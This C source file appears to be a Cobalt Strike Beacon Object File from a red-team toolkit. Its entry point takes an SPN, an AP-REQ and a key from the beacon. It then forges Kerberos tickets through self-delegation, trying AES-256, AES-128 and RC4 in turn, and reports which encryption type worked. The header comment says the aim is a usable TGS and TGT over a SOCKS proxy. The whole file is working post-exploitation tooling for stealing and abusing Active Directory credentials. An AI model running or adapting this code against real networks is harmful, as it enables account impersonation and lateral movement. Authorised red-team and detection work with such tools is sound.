/*!
 *
 * PostEx
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

/*!
 *
 * Purpose:
 *
 * Requests a AS-REP response from the KDC and
 * prints the session key back to the caller.
 *
 * With this, we can create a working TGS and
 * acquire a TGT along with it through a socks
 * proxy.
 *
!*/
VOID KrbTgsGo( _In_ PVOID Argv, _In_ INT Argc )
{
	datap	Psr;

	PCHAR	Apr = NULL;
	PCHAR	Key = NULL;
	HANDLE	Ntl = NULL;
	PWCHAR	Spn = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Psr, sizeof( Psr ) );

	/* Extract the arguments we need */
	BeaconDataParse( &Psr, Argv, Argc );
	Spn = C_PTR( BeaconDataExtract( &Psr, NULL ) );
	Apr = C_PTR( BeaconDataExtract( &Psr, NULL ) );
	Key = C_PTR( BeaconDataExtract( &Psr, NULL ) );

	/* An SPN was provided as requested */
	if ( Spn != NULL && Apr != NULL && Key != NULL ) 
	{
		/* Attempt to perform self-delegation using Kerberos Encryption AES-256 */
		if ( ! KrbForgeTicket( Spn, KERB_ETYPE_AES256_CTS_HMAC_SHA1_96, Apr, Key ) ) 
		{
			/* Attempt to perform self-delegation using Kerberos Encryption AES-128 */
			if ( ! KrbForgeTicket( Spn, KERB_ETYPE_AES128_CTS_HMAC_SHA1_96, Apr, Key ) ) 
			{
				/* Attempt to perform self-delegation using Kerberos Encpryiton RC4 */
				if ( ! KrbForgeTicket( Spn, KERB_ETYPE_RC4_HMAC_NT, Apr, Key  ) ) 
				{
					BeaconPrintf( CALLBACK_ERROR, "krbtgs was unable to request a useable ticket." );
				} else {
					/* Notify encryption type */
					BeaconPrintf( CALLBACK_OUTPUT, "Using KERB_ETYPE_RC4_HMAC_NT" );
				};
			} else {
				/* Notify encryption type */
				BeaconPrintf( CALLBACK_OUTPUT, "Using KERB_ETYPE_AES128_CTS_HMAC_SHA1_96" );
			};
		} else {
			/* Notify encryption type */
			BeaconPrintf( CALLBACK_OUTPUT, "Using KERB_ETYPE_AES256_CTS_HMAC_SHA1_96" );
		};
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Psr, sizeof( Psr ) );
};
